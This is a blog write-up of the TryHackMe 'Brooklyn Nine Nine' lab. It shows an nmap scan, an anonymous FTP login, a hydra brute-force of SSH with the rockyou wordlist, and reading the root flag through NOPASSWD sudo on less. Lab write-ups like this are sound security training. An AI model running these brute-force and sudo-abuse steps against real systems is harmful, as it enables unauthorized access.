---
title : "Brooklyn Nine Nine - Write Up"
date : 2021-07-03T16:53:59+02:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
tags : ["hydra", "FTP", "sudo", "less", "TryHackMe"]
description : "TryHackMe's easy level machine."
---

| Link | Level | Creator |
|------|-------|---------|
| [Here](https://tryhackme.com/room/brooklynninenine)  | Easy  |  [Fsociety2006](https://tryhackme.com/p/Fsociety2006)  |

## Reconn

Using `nmap` we can detect an FTP server with the _anonymous_ user activated.

```bash
╰─ lanfran@parrot ❯ map 10.10.79.24                                                                                                ─╯
[sudo] password for lanfran: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 12:41 CEST
Nmap scan report for 10.10.79.24
Host is up (0.055s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.6.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.25 seconds
```
I logged to the FTP and downloaded the file inside.
```bash
╰─ lanfran@parrot ❯ ftp 10.10.79.24                                                                                                ─╯
Connected to 10.10.79.24.
220 (vsFTPd 3.0.3)
Name (10.10.79.24:lanfran): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.14 secs (0.8191 kB/s)
ftp> 
```

## Foothold - User

Reading the note, we get the name of 2 users, `Jake and Amy`, and Amy said to jake that his password is too weak.

So let's use **hydra** against the SSH with the user Jake and the wordlist _Rockyou_

```bash
╰─ lanfran@parrot ❯ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.79.24                                            ─╯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-04 12:49:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.79.24:22/
[22][ssh] host: 10.10.79.24   login: jake   password: [REDACTED]

```
Great! We have now the password for Jake!

Let's login, and retrieve the user's flag that's inside `/home/holt/user.txt`

## Root

Once inside the machine, I ran `sudo -l` to check if the user it's inside the sudoers file. Luckily he is!


```bash
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

So let's read the root's flag with `less`.

```bash
jake@brookly_nine_nine:~$ sudo /usr/bin/less /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: [REDACTED]

Enjoy!!
/root/root.txt (END)
```

And that's it!

We rooted the machine!

That's all from my side, hope you find this helpful!